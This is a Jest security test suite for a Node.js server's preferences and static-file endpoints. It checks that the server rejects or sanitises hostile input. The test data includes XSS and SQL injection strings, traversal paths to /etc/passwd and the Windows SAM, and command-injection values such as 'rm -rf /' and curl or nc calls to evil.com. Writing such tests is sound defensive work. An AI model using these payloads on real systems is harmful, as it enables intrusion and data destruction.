/**
 * Security Validation Tests
 * Tests security aspects of the application
 */

const request = require('supertest');
const app = require('../server');
const path = require('path');

describe('Security Validation Tests', () => {
  describe('Input Validation', () => {
    test('should sanitize malicious preferences input', async () => {
      const maliciousPrefs = {
        selectedAudioDevice: '<script>alert("xss")</script>',
        audioSettings: {
          sampleRate: '44100; DROP TABLE users;',
          bufferSize: '<img src=x onerror=alert(1)>',
          gain: 'javascript:alert(1)'
        },
        uiSettings: {
          theme: '../../../etc/passwd',
          autoStart: '<script>window.location="http://evil.com"</script>',
          fullscreen: 'true" onload="alert(1)'
        },
        systemSettings: {
          port: '3000; rm -rf /',
          host: '0.0.0.0\n\nmalicious-header: evil'
        }
      };

      const response = await request(app)
        .post('/api/preferences')
        .send({ preferences: maliciousPrefs });

      // Should either reject or sanitize
      if (response.status === 200) {
        // If accepted, should be sanitized
        expect(response.body.preferences.selectedAudioDevice).not.toContain('<script>');
        expect(response.body.preferences.audioSettings.sampleRate).not.toContain('DROP TABLE');
        expect(response.body.preferences.uiSettings.theme).not.toContain('../../../');
      } else {
        // Should reject with appropriate error
        expect([400, 422]).toContain(response.status);
      }
    });

    test('should reject oversized payloads', async () => {
      const oversizedPrefs = {
        selectedAudioDevice: 'x'.repeat(10000),
        audioSettings: {
          sampleRate: 44100,
          bufferSize: 1024,
          gain: 1.0,
          extraData: 'x'.repeat(1024 * 1024) // 1MB of extra data
        }
      };

      const response = await request(app)
        .post('/api/preferences')
        .send({ preferences: oversizedPrefs });

      // Should reject large payloads
      expect([400, 413, 422]).toContain(response.status);
    });

    test('should validate data types', async () => {
      const invalidTypePrefs = {
        selectedAudioDevice: 12345, // Should be string
        audioSettings: 'invalid', // Should be object
        uiSettings: [], // Should be object
        systemSettings: null // Should be object
      };

      const response = await request(app)
        .post('/api/preferences')
        .send({ preferences: invalidTypePrefs });

      // Should reject invalid types
      expect([400, 422]).toContain(response.status);
    });
  });

  describe('Path Traversal Prevention', () => {
    test('should prevent directory traversal in static files', async () => {
      const traversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      ];

      for (const attempt of traversalAttempts) {
        const response = await request(app)
          .get(`/${attempt}`);
        
        // Should not return sensitive files
        expect([404, 403, 400]).toContain(response.status);
        
        if (response.text) {
          expect(response.text.toLowerCase()).not.toContain('root:');
          expect(response.text.toLowerCase()).not.toContain('administrator');
        }
      }
    });

    test('should prevent path traversal in API endpoints', async () => {
      const traversalPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\hosts',
        '/etc/hosts',
        'C:\\Windows\\System32\\drivers\\etc\\hosts'
      ];

      for (const maliciousPath of traversalPaths) {
        // Test various API endpoints that might accept file paths
        const endpoints = [
          `/api/file/${encodeURIComponent(maliciousPath)}`,
          `/api/config/${encodeURIComponent(maliciousPath)}`,
          `/api/log/${encodeURIComponent(maliciousPath)}`
        ];

        for (const endpoint of endpoints) {
          const response = await request(app).get(endpoint);
          
          // Should not return sensitive files or crash
          expect([404, 403, 400, 501]).toContain(response.status);
        }
      }
    });
  });

  describe('HTTP Security Headers', () => {
    test('should include security headers', async () => {
      const response = await request(app)
        .get('/')
        .expect(200);

      // Check for basic security headers
      const headers = response.headers;
      
      // X-Content-Type-Options should prevent MIME sniffing
      if (headers['x-content-type-options']) {
        expect(headers['x-content-type-options']).toBe('nosniff');
      }

      // X-Frame-Options should prevent clickjacking
      if (headers['x-frame-options']) {
        expect(['DENY', 'SAMEORIGIN']).toContain(headers['x-frame-options']);
      }

      // Content-Security-Policy should be restrictive
      if (headers['content-security-policy']) {
        expect(headers['content-security-policy']).toContain('default-src');
      }
    });

    test('should handle CORS appropriately', async () => {
      const response = await request(app)
        .get('/api/health')
        .set('Origin', 'http://malicious-site.com')
        .expect(200);

      // CORS headers should be present but restrictive
      if (response.headers['access-control-allow-origin']) {
        // Should not allow all origins in production
        if (process.env.NODE_ENV === 'production') {
          expect(response.headers['access-control-allow-origin']).not.toBe('*');
        }
      }
    });
  });

  describe('Authentication and Authorization', () => {
    test('should not expose sensitive system information', async () => {
      const response = await request(app)
        .get('/api/system-info')
        .expect(200);

      // Should not expose sensitive details
      expect(response.body.systemInfo).toBeDefined();
      
      // Should not expose internal paths
      if (response.body.systemInfo.configPath) {
        expect(response.body.systemInfo.configPath).not.toContain('/etc/');
        expect(response.body.systemInfo.configPath).not.toContain('C:\\Windows\\');
      }

      // Should not expose environment variables
      expect(response.body.systemInfo.env).toBeUndefined();
      expect(response.body.systemInfo.environment).toBeUndefined();
    });

    test('should not expose internal server details', async () => {
      const response = await request(app)
        .get('/api/health')
        .expect(200);

      // Should not expose server implementation details
      expect(response.headers['server']).toBeUndefined();
      expect(response.headers['x-powered-by']).toBeUndefined();
    });
  });

  describe('Error Handling Security', () => {
    test('should not expose stack traces in production', async () => {
      // Force an error
      const response = await request(app)
        .post('/api/preferences')
        .send({ invalid: 'data' });

      // Should not expose stack traces
      if (response.body.error) {
        expect(response.body.error).not.toContain('at ');
        expect(response.body.error).not.toContain('Error:');
        expect(response.body.error).not.toContain(__dirname);
      }

      if (response.text) {
        expect(response.text).not.toContain('at ');
        expect(response.text).not.toContain(__dirname);
      }
    });

    test('should handle malformed JSON gracefully', async () => {
      const response = await request(app)
        .post('/api/preferences')
        .set('Content-Type', 'application/json')
        .send('{"invalid": json}');

      // Should handle gracefully without exposing internals
      expect([400, 422]).toContain(response.status);
      
      if (response.body.error) {
        expect(response.body.error).not.toContain('SyntaxError');
        expect(response.body.error).not.toContain('JSON.parse');
      }
    });
  });

  describe('File System Security', () => {
    test('should not allow access to system files', async () => {
      const systemFiles = [
        '/etc/passwd',
        '/etc/shadow',
        '/proc/version',
        'C:\\Windows\\System32\\config\\SAM',
        'C:\\Windows\\System32\\drivers\\etc\\hosts'
      ];

      for (const file of systemFiles) {
        const response = await request(app)
          .get(`/static/${encodeURIComponent(file)}`);
        
        expect([404, 403]).toContain(response.status);
      }
    });

    test('should validate file extensions', async () => {
      const dangerousFiles = [
        'malicious.exe',
        'script.bat',
        'payload.sh',
        'virus.com',
        'trojan.scr'
      ];

      for (const file of dangerousFiles) {
        const response = await request(app)
          .get(`/static/${file}`);
        
        // Should not serve executable files
        expect([404, 403]).toContain(response.status);
      }
    });
  });

  describe('Injection Prevention', () => {
    test('should prevent command injection in audio device queries', async () => {
      // Mock malicious device IDs that could cause command injection
      const maliciousDeviceIds = [
        'device; rm -rf /',
        'device && curl evil.com',
        'device | nc evil.com 1234',
        'device`curl evil.com`',
        'device$(curl evil.com)'
      ];

      for (const deviceId of maliciousDeviceIds) {
        const response = await request(app)
          .post('/api/preferences')
          .send({
            preferences: {
              selectedAudioDevice: deviceId,
              audioSettings: { sampleRate: 44100, bufferSize: 1024, gain: 1.0 },
              uiSettings: { theme: 'dark', autoStart: true, fullscreen: false },
              systemSettings: { port: 3000, host: '0.0.0.0' }
            }
          });

        // Should handle without executing commands
        expect([200, 400, 422]).toContain(response.status);
        
        if (response.status === 200) {
          // If accepted, should be sanitized
          expect(response.body.preferences.selectedAudioDevice).not.toContain(';');
          expect(response.body.preferences.selectedAudioDevice).not.toContain('&&');
          expect(response.body.preferences.selectedAudioDevice).not.toContain('|');
        }
      }
    });

    test('should prevent SQL injection attempts', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' UNION SELECT * FROM sensitive_data --"
      ];

      for (const injection of sqlInjectionAttempts) {
        const response = await request(app)
          .post('/api/preferences')
          .send({
            preferences: {
              selectedAudioDevice: injection,
              audioSettings: { sampleRate: 44100, bufferSize: 1024, gain: 1.0 },
              uiSettings: { theme: 'dark', autoStart: true, fullscreen: false },
              systemSettings: { port: 3000, host: '0.0.0.0' }
            }
          });

        // Should handle without SQL execution (even though we don't use SQL)
        expect([200, 400, 422]).toContain(response.status);
      }
    });
  });

  describe('Rate Limiting', () => {
    test('should handle rapid requests gracefully', async () => {
      const requests = [];
      const requestCount = 100;

      // Fire many requests rapidly
      for (let i = 0; i < requestCount; i++) {
        requests.push(request(app).get('/api/health'));
      }

      const responses = await Promise.all(requests);
      
      // Should handle all requests without crashing
      responses.forEach(response => {
        expect([200, 429]).toContain(response.status);
      });

      // Most should succeed (basic rate limiting test)
      const successCount = responses.filter(r => r.status === 200).length;
      expect(successCount).toBeGreaterThan(requestCount * 0.5); // At least 50% should succeed
    });
  });

  describe('Information Disclosure', () => {
    test('should not expose sensitive configuration', async () => {
      const response = await request(app)
        .get('/api/config')
        .expect(404); // Should not exist or be accessible

      // If it exists, should not expose sensitive data
      if (response.status === 200) {
        expect(response.body.database).toBeUndefined();
        expect(response.body.secrets).toBeUndefined();
        expect(response.body.keys).toBeUndefined();
        expect(response.body.passwords).toBeUndefined();
      }
    });

    test('should not expose debug information', async () => {
      const response = await request(app)
        .get('/api/debug')
        .expect(404); // Should not exist in production

      if (response.status === 200) {
        expect(response.body.stack).toBeUndefined();
        expect(response.body.memory).toBeUndefined();
        expect(response.body.env).toBeUndefined();
      }
    });
  });
});